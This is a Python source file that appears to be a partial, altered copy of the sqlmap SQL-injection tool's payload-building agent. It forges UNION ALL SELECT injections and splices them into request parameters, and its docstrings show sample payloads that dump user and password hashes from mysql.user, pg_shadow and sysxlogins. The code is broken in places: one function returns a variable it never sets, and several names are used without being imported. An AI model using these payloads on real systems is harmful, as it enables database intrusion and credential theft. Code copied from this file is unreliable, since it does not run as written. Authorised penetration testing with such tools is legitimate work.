#from core.utils.enums import PLACEMETHOD
import re
import urlparse
from common import paramToDict
from common import urlencode

from lib.utils.common import randomInt, randomStr, getUnicode, Backend
from lib.utils.unescaper import unescaper
from lib.utils.enums import DBMS
from lib.utils.enums import PLACE, PAYLOAD, SLEEP_TIME_MARKER, SINGLE_QUOTE_MARKER, FROM_DUMMY_TABLE
from lib.utils.common import extractRegexResult, zeroDepthSearch,splitFields
from lib.config import conf,kb


PAYLOAD_DELIMITER = "__PAYLOAD_DELIMITER__"
BOUNDARY_BACKSLASH_MARKER = "__BACKSLASH__"




class Agent(object):

    def addPayloadDelimiters(self, value):
        """
        Adds payload delimiters around the input string
        """
        return value
        #return "%s%s%s" % (PAYLOAD_DELIMITER, value, PAYLOAD_DELIMITER) if
        #value else value

    def extractPayload(self, value):
        """
        Extracts payload from inside of the input string
        """

        _ = re.escape(PAYLOAD_DELIMITER)

        return extractRegexResult("(?s)%s(?P<result>.*?)%s" % (_, _), value)

    def cleanupPayload(self, payload, origValue=None):
        if payload is None:
            return

        _ = (('[DELIMITER_START]', 'qzkzq'), ('[DELIMITER_STOP]', 'qpkpq'), ('[AT_REPLACE]', 'qtq'), ('[SPACE_REPLACE]', 'qiq'), ('[DOLLAR_REPLACE]', 'qvq'), ('[HASH_REPLACE]', 'qiq'), ('[GENERIC_SQL_COMMENT]','-- [RANDSTR]'))

        payload = reduce(lambda x, y: x.replace(y[0], y[1]), _, payload)

        for _ in set(re.findall(r"\[RANDNUM(?:\d+)?\]", payload, re.I)):
            payload = payload.replace(_, str(randomInt()))

        for _ in set(re.findall(r"\[RANDSTR(?:\d+)?\]", payload, re.I)):
            payload = payload.replace(_, randomStr())

        if origValue is not None:
            payload = payload.replace("[ORIGVALUE]", origValue if origValue.isdigit() else unescaper.escape("'%s'" % origValue))

        if "[INFERENCE]" in payload:
            if Backend.getIdentifiedDbms() is not None:
                inference = queries[Backend.getIdentifiedDbms()].inference

                if "dbms_version" in inference:
                    if isDBMSVersionAtLeast(inference.dbms_version):
                        inferenceQuery = inference.query
                    else:
                        inferenceQuery = inference.query2
                else:
                    inferenceQuery = inference.query

                payload = payload.replace("[INFERENCE]", inferenceQuery)
            elif not kb.testMode:
                errMsg = "invalid usage of inference payload without "
                errMsg += "knowledge of underlying DBMS"
                raise SqlmapNoneDataException(errMsg)

        return payload


    def prefixQuery(self, expression, prefix=None, where=None, clause=None):
        """
        This method defines how the input expression has to be escaped
        to perform the injection depending on the injection type
        identified as valid
        """


        if expression is None:
            return None

        expression = self.cleanupPayload(expression)
        expression = unescaper.escape(expression)
        query = prefix or ""
        if not (expression and expression[0] == ';') and not (query and query[-1] in ('(', ')') and expression and expression[0] in ('(', ')')) and not (query and query[-1] == '('):
            query += " "
        query = "%s%s" % ((query or ""), expression)

        return query

    def suffixQuery(self, expression, comment=None, suffix=None, where=None):
        """
        This method appends the DBMS comment to the
        SQL injection request
        """

        if expression is None:
            return None

        expression = self.cleanupPayload(expression)

        if comment is not None:
            expression += comment

        if suffix and not comment:
            expression += suffix

        return re.sub(r"(?s);\W*;", ";", expression)

    
    def adjustLateValues(self, payload):
            """
            Returns payload with a replaced late tags (e.g. SLEEPTIME)
            """

            if payload:
                payload = payload.replace(SLEEP_TIME_MARKER, str(conf.timeSec))
                payload = payload.replace(SINGLE_QUOTE_MARKER, "'")

                for _ in set(re.findall(r"\[RANDNUM(?:\d+)?\]", payload, re.I)):
                    payload = payload.replace(_, str(randomInt()))

                for _ in set(re.findall(r"\[RANDSTR(?:\d+)?\]", payload, re.I)):
                    payload = payload.replace(_, randomStr())

            return payload

    def getComment(self, request):
        """
        Returns comment form for the given request
        """

        return request.comment if "comment" in request else ""

    def nullCastConcatFields(self, fields):
        """
        Take in input a sequence of fields string and return its processed
        nulled, casted and concatenated fields string.

        Examples:

        MySQL input:  user,password
        MySQL output: IFNULL(CAST(user AS CHAR(10000)), ' '),'UWciUe',IFNULL(CAST(password AS CHAR(10000)), ' ')
        MySQL scope:  SELECT user, password FROM mysql.user

        PostgreSQL input:  usename,passwd
        PostgreSQL output: COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'xRBcZW'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  SELECT usename, passwd FROM pg_shadow

        Oracle input:  COLUMN_NAME,DATA_TYPE
        Oracle output: NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'UUlHUa'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'

        Microsoft SQL Server input:  name,master.dbo.fn_varbintohexstr(password)
        Microsoft SQL Server output: ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'nTBdow'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins

        @param fields: fields string to be processed
        @type fields: C{str}

        @return: fields string nulled, casted and concatened
        @rtype: C{str}
        """

        # if not Backend.getIdentifiedDbms():
        #     return fields

        if fields.startswith("(CASE") or fields.startswith("(IIF") or fields.startswith("SUBSTR") or fields.startswith("MID(") or re.search(r"\A'[^']+'\Z", fields):
            nulledCastedConcatFields = fields
        else:
            pass

        return nulledCastedConcatFields

    
    def getFields(self, query):
        """
        Take in input a query string and return its fields (columns) and
        more details.

        Example:

        Input:  SELECT user, password FROM mysql.user
        Output: user,password

        @param query: query to be processed
        @type query: C{str}

        @return: query fields (columns) and more details
        @rtype: C{str}
        """

        prefixRegex = r"(?:\s+(?:FIRST|SKIP|LIMIT(?: \d+)?)\s+\d+)*"
        fieldsSelectTop = re.search(r"\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", query, re.I)
        fieldsSelectRownum = re.search(r"\ASELECT\s+([^()]+?),\s*ROWNUM AS LIMIT FROM", query, re.I)
        fieldsSelectDistinct = re.search(r"\ASELECT%s\s+DISTINCT\((.+?)\)\s+FROM" % prefixRegex, query, re.I)
        fieldsSelectCase = re.search(r"\ASELECT%s\s+(\(CASE WHEN\s+.+\s+END\))" % prefixRegex, query, re.I)
        fieldsSelectFrom = re.search(r"\ASELECT%s\s+(.+?)\s+FROM " % prefixRegex, query, re.I)
        fieldsExists = re.search(r"EXISTS\(([^)]*)\)\Z", query, re.I)
        fieldsSelect = re.search(r"\ASELECT%s\s+(.*)" % prefixRegex, query, re.I)
        fieldsSubstr = re.search(r"\A(SUBSTR|MID\()", query, re.I)
        fieldsMinMaxstr = re.search(r"(?:MIN|MAX)\(([^\(\)]+)\)", query, re.I)
        fieldsNoSelect = query

        _ = zeroDepthSearch(query, " FROM ")
        if not _:
            fieldsSelectFrom = None

        fieldsToCastStr = fieldsNoSelect

        if fieldsSubstr:
            fieldsToCastStr = query
        elif fieldsMinMaxstr:
            fieldsToCastStr = fieldsMinMaxstr.group(1)
        elif fieldsExists:
            if fieldsSelect:
                fieldsToCastStr = fieldsSelect.group(1)
        elif fieldsSelectTop:
            fieldsToCastStr = fieldsSelectTop.group(1)
        elif fieldsSelectRownum:
            fieldsToCastStr = fieldsSelectRownum.group(1)
        elif fieldsSelectDistinct:
            if Backend.getDbms() in (DBMS.HSQLDB,):
                fieldsToCastStr = fieldsNoSelect
            else:
                fieldsToCastStr = fieldsSelectDistinct.group(1)
        elif fieldsSelectCase:
            fieldsToCastStr = fieldsSelectCase.group(1)
        elif fieldsSelectFrom:
            fieldsToCastStr = query[:unArrayizeValue(_)] if _ else query
            fieldsToCastStr = re.sub(r"\ASELECT%s\s+" % prefixRegex, "", fieldsToCastStr)
        elif fieldsSelect:
            fieldsToCastStr = fieldsSelect.group(1)

        fieldsToCastStr = fieldsToCastStr or ""

        # Function
        if re.search(r"\A\w+\(.*\)", fieldsToCastStr, re.I) or (fieldsSelectCase and "WHEN use" not in query) or fieldsSubstr:
            fieldsToCastList = [fieldsToCastStr]
        else:
            fieldsToCastList = splitFields(fieldsToCastStr)

        return fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, fieldsToCastList, fieldsToCastStr, fieldsExists


    def concatQuery(self, query, unpack=True):
        """
        Take in input a query string and return its processed nulled,
        casted and concatenated query string.

        Examples:

        MySQL input:  SELECT user, password FROM mysql.user
        MySQL output: CONCAT('mMvPxc',IFNULL(CAST(user AS CHAR(10000)), ' '),'nXlgnR',IFNULL(CAST(password AS CHAR(10000)), ' '),'YnCzLl') FROM mysql.user

        PostgreSQL input:  SELECT usename, passwd FROM pg_shadow
        PostgreSQL output: 'HsYIBS'||COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'KTBfZp'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')||'LkhmuP' FROM pg_shadow

        Oracle input:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'
        Oracle output: 'GdBRAo'||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'czEHOf'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')||'JVlYgS' FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'

        Microsoft SQL Server input:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
        Microsoft SQL Server output: 'QQMQJO'+ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'kAtlqH'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')+'lpEqoi' FROM master..sysxlogins

        @param query: query string to be processed
        @type query: C{str}

        @return: query string nulled, casted and concatenated
        @rtype: C{str}
        """

        if unpack:
            concatenatedQuery = ""
            query = query.replace(", ", ',')
            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr, fieldsExists = self.getFields(query)
            castedFields = self.nullCastConcatFields(fieldsToCastStr)
            concatenatedQuery = query.replace(fieldsToCastStr, castedFields, 1)
        else:
            return query

        if Backend.isDbms(DBMS.MYSQL):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += ",'%s')" % kb.chars.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += ",'%s')" % kb.chars.stop
            elif fieldsSelectFrom:
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s,'%s')%s" % (concatenatedQuery[:_].replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1), kb.chars.stop, concatenatedQuery[_:])
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += ",'%s')" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "CONCAT('%s',%s,'%s')" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.ORACLE, DBMS.SQLITE, DBMS.DB2, DBMS.FIREBIRD, DBMS.HSQLDB, DBMS.H2):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.chars.start, 1)
                concatenatedQuery += "||'%s'" % kb.chars.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||(SELECT " % kb.chars.start, 1)
                concatenatedQuery += ")||'%s'" % kb.chars.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.chars.start, 1)
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s||'%s'%s" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])
                concatenatedQuery = re.sub(r"('%s'\|\|)(.+)(%s)" % (kb.chars.start, re.escape(castedFields)), r"\g<2>\g<1>\g<3>", concatenatedQuery)
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.chars.start, 1)
                concatenatedQuery += "||'%s'" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'||%s||'%s'" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.chars.start, 1)
                concatenatedQuery += "+'%s'" % kb.chars.stop
            elif fieldsSelectTop:
                topNum = re.search(r"\ASELECT\s+TOP\s+([\d]+)\s+", concatenatedQuery, re.I).group(1)
                concatenatedQuery = concatenatedQuery.replace("SELECT TOP %s " % topNum, "TOP %s '%s'+" % (topNum, kb.chars.start), 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'%s' FROM " % kb.chars.stop, 1)
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.chars.start, 1)
                concatenatedQuery += "+'%s'" % kb.chars.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.chars.start, 1)
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s+'%s'%s" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.chars.start, 1)
                concatenatedQuery += "+'%s'" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'+%s+'%s'" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        elif Backend.isDbms(DBMS.ACCESS):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'&" % kb.chars.start, 1)
                concatenatedQuery += "&'%s'" % kb.chars.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'&(SELECT " % kb.chars.start, 1)
                concatenatedQuery += ")&'%s'" % kb.chars.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'&" % kb.chars.start, 1)
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s&'%s'%s" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'&" % kb.chars.start, 1)
                concatenatedQuery += "&'%s'" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'&%s&'%s'" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        else:
            warnMsg = "applying generic concatenation (CONCAT)"
            singleTimeWarnMessage(warnMsg)

            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT(CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += "),'%s')" % kb.chars.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT(CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += "),'%s')" % kb.chars.stop
            elif fieldsSelectFrom:
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s),'%s')%s" % (concatenatedQuery[:_].replace("SELECT ", "CONCAT(CONCAT('%s'," % kb.chars.start, 1), kb.chars.stop, concatenatedQuery[_:])
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT(CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += "),'%s')" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "CONCAT(CONCAT('%s',%s),'%s')" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        return concatenatedQuery


    def forgeUnionQuery(self, query, position, count, comment, prefix, suffix, char, where, multipleUnions=None, limited=False, fromTable=None):
        """
        Take in input an query (pseudo query) string and return its
        processed UNION ALL SELECT query.

        Examples:

        MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user
        MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488

        PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow
        PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713

        Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))
        Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738

        Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins
        Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254

        @param query: it is a processed query string unescaped to be
        forged within an UNION ALL SELECT statement
        @type query: C{str}

        @param position: it is the NULL position where it is possible
        to inject the query
        @type position: C{int}

        @return: UNION ALL SELECT query string forged
        @rtype: C{str}
        """

        
        if conf.uFrom:
            fromTable = " FROM %s" % conf.uFrom
        elif not fromTable:
            if kb.tableFrom:
                fromTable = " FROM %s" % kb.tableFrom
            else:
                fromTable = FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), "")

        if query.startswith("SELECT "):
            query = query[len("SELECT "):]

        unionQuery = self.prefixQuery("UNION ALL SELECT ", prefix=prefix)

        if limited:
            unionQuery += ','.join(char if _ != position else '(SELECT %s)' % query for _ in xrange(0, count))
            unionQuery += fromTable
            unionQuery = self.suffixQuery(unionQuery, comment, suffix)

            return unionQuery
        else:
            _ = zeroDepthSearch(query, " FROM ")
            if _:
                fromTable = query[_[0]:]

            if fromTable and query.endswith(fromTable):
                query = query[:-len(fromTable)]

        topNumRegex = re.search(r"\ATOP\s+([\d]+)\s+", query, re.I)
        if topNumRegex:
            topNum = topNumRegex.group(1)
            query = query[len("TOP %s " % topNum):]
            unionQuery += "TOP %s " % topNum

        intoRegExp = re.search(r"(\s+INTO (DUMP|OUT)FILE\s+'(.+?)')", query, re.I)

        if intoRegExp:
            intoRegExp = intoRegExp.group(1)
            query = query[:query.index(intoRegExp)]

            position = 0
            char = 'NULL'

        for element in xrange(0, count):
            if element > 0:
                unionQuery += ','

            if element == position:
                unionQuery += query
            else:
                unionQuery += char

        if fromTable and not unionQuery.endswith(fromTable):
            unionQuery += fromTable

        if intoRegExp:
            unionQuery += intoRegExp

        if multipleUnions:
            unionQuery += " UNION ALL SELECT "

            for element in xrange(count):
                if element > 0:
                    unionQuery += ','

                if element == position:
                    unionQuery += multipleUnions
                else:
                    unionQuery += char

            if fromTable:
                unionQuery += fromTable

        unionQuery = self.suffixQuery(unionQuery, comment, suffix)

        return unionQuery

    def payload_t(self, paramDict, parameters=None, place=None, parameter=None, value=None, newValue=None, where=None):
        """
        This method replaces the affected parameter with the SQL
        injection statement to request
        """

        retVal = ""
        paramString = parameters[place]
        paramDict = paramDict[place]
        origValue = getUnicode(paramDict[parameter])

        #如果参数值为空则生成个值
        if value is None:
            if where == PAYLOAD.WHERE.ORIGINAL:
                value = origValue
            elif where == PAYLOAD.WHERE.NEGATIVE:
                # if conf.invalidLogical:
                #     match = re.search(r'\A[^ ]+', newValue)
                #     newValue = newValue[len(match.group() if match else ""):]
                #     _ = randomInt(2)
                #     value = "%s%s AND %s=%s" % (origValue, match.group() if match else "", _, _ + 1)
                # elif conf.invalidBignum:
                #     value = randomInt(6)
                # elif conf.invalidString:
                #     value = randomStr(6)
                # else:
                if newValue.startswith("-"):
                    value = ""
                else:
                    value = "-%s" % randomInt()
            elif where == PAYLOAD.WHERE.REPLACE:
                value = ""
            else:
                value = origValue

            newValue = "%s%s" % (value, newValue)

        newValue = self.cleanupPayload(newValue, origValue)

        #支持修改http中各种请求的参数
        if place in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):
            pass
        elif place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):
            pass
        else:
            def _(pattern, repl, string):
                retVal = string
                match = None
                for match in re.finditer(pattern, string):
                    pass

                if match:
                    while True:
                        _ = re.search(r"\\g<([^>]+)>", repl)
                        if _:
                            try:
                                repl = repl.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1)))
                            except IndexError:
                                break
                        else:
                            break
                    retVal = string[:match.start()] + repl + string[match.end():]
                return retVal

            if origValue:
                regex = r"(\A|\b)%s=%s%s" % (re.escape(parameter), re.escape(origValue), r"(\Z|\b)" if origValue[-1].isalnum() else "")
                retVal = _(regex, "%s=%s" % (parameter, self.addPayloadDelimiters(newValue.replace("\\", "\\\\"))), paramString)
            else:
                retVal = _(r"(\A|\b)%s=%s(\Z|%s|%s|\s)" % (re.escape(parameter), re.escape(origValue), DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER), "%s=%s\g<2>" % (parameter, self.addPayloadDelimiters(newValue.replace("\\", "\\\\"))), paramString)

            if retVal == paramString and urlencode(parameter) != parameter:
                pass
                retVal = _(r"(\A|\b)%s=%s" % (re.escape(urlencode(parameter)), re.escape(origValue)), "%s=%s" % (urlencode(parameter), self.addPayloadDelimiters(newValue.replace("\\", "\\\\"))), paramString)


        if retVal:
            retVal = retVal.replace(BOUNDARY_BACKSLASH_MARKER, '\\')

        return retVal




    def payload(self, place=None, parameter=None, value=None, newValue=None, where=None, addValue=None):

        """
        This method replaces the affected parameter with the SQL
        injection statement to request
        """
      
        retVal = ""
        paramString = place['paramstring']
        paramDict = place['paramdict']
        origValue = paramDict[parameter]#getUnicode(paramDict[parameter])
        
        randstr = ""

        if addValue is not None:
            value = origValue
            newValue = "%s%s" % (value, addValue)
            newValue = urlencode(newValue, '%', False, 'GET' != 'URI')
        else:
            if value is None:
                if all(c in "0123456789.+-" for c in parameter):
                    randstr = str(randomInt())
                else:
                    randstr = randomStr()
            
                return randstr

        #    """
        #    if where == PAYLOAD.WHERE.ORIGINAL:
        #        value = origValue
        #    elif where == PAYLOAD.WHERE.NEGATIVE:
        #        if conf.invalidLogical:
        #            match = re.search(r'\A[^ ]+', newValue)
        #            newValue = newValue[len(match.group() if match else ""):]
        #            _ = randomInt(2)
        #            value = "%s%s AND %s=%s" % (origValue, match.group() if
        #            match else "", _, _ + 1)
        #        elif conf.invalidBignum:
        #            value = randomInt(6)
        #        elif conf.invalidString:
        #            value = randomStr(6)
        #        else:
        #            if newValue.startswith("-"):
        #                value = ""
        #            else:
        #                value = "-%s" % randomInt()
        #    """
        

        if False:
            pass
        else:
            def _(pattern, repl, string):
                retVal = string
                match = None
                for match in re.finditer(pattern, string):
                    pass

                if match:
                    while True:
                        _ = re.search(r"\\g<([^>]+)>", repl)
                        if _:
                            try:
                                repl = repl.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1)))
                            except IndexError:
                                break
                        else:
                            break
                    retVal = string[:match.start()] + repl + string[match.end():]
                return retVal

            if origValue:
                regex = r"(\A|\b)%s=%s%s" % (re.escape(parameter), re.escape(origValue), r"(\Z|\b)" if origValue[-1].isalnum() else "")
                retVal = _(regex, "%s=%s" % (parameter, self.addPayloadDelimiters(newValue.replace("\\", "\\\\"))), paramString)

            
            """
            else:
                retVal = _(r"(\A|\b)%s=%s(\Z|%s|%s|\s)" % (re.escape(parameter), re.escape(origValue), DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER), "%s=%s\g<2>" % (parameter, self.addPayloadDelimiters(newValue.replace("\\", "\\\\"))), paramString)

            if retVal == paramString and urlencode(parameter) != parameter:
                retVal = _(r"(\A|\b)%s=%s" % (re.escape(urlencode(parameter)), re.escape(origValue)), "%s=%s" % (urlencode(parameter), self.addPayloadDelimiters(newValue.replace("\\", "\\\\"))), paramString)
            """

        if retVal:
            retVal = retVal.replace(BOUNDARY_BACKSLASH_MARKER, '\\')

        return retVal
       
agent = Agent()




